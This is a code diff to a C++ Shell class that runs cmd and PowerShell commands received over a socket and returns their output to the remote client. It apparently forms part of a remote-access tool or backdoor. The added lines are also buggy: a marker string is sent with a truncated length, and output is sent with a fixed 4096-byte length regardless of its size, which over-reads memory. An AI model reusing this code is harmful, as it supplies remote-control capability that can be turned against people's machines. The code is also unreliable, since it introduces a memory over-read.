@@ -1,6 +1,7 @@
 #include "Shell.h"
 #define FILE_TMP "cmd.tmp"
 #define BUFFER_LEN 256
+#define HUGE 4096
 
 std::string Shell::return_command(const std::string cmd)
 {
@@ -45,7 +46,12 @@ void Shell::runCMD(SOCKET* client,const std::vector<std::string> args)
 		cmd=cmd+args[iargs]+" ";
 	}
 	std::string ret = Shell::return_command(cmd);
-	if (ret != "") { send(*client, ret.c_str(), BUFFER_LEN, 0); }
+	std::cout << ret << std::endl;
+	if (ret != "") 
+	{ 
+		send(*client, "HUGE_BUFFER", 5, 0);
+		send(*client, ret.c_str(), HUGE, 0); 
+	}
 }
 void Shell::runPOWERSHELL(SOCKET* client, const std::vector<std::string> args)
 {
@@ -55,7 +61,11 @@ void Shell::runPOWERSHELL(SOCKET* client, const std::vector<std::string> args)
 		cmd = cmd + args[iargs] + " ";
 	}
 	std::string ret = Shell::return_command(cmd).c_str();
-	if (ret != "") {send(*client, ret.c_str(), BUFFER_LEN, 0); }
+	if (ret != "") 
+	{
+		send(*client, "HUGE_BUFFER", 5, 0);
+		send(*client, ret.c_str(), HUGE, 0);
+	}
 }
 
 void Shell::uploadToClientExe(Client* client, std::string filename)
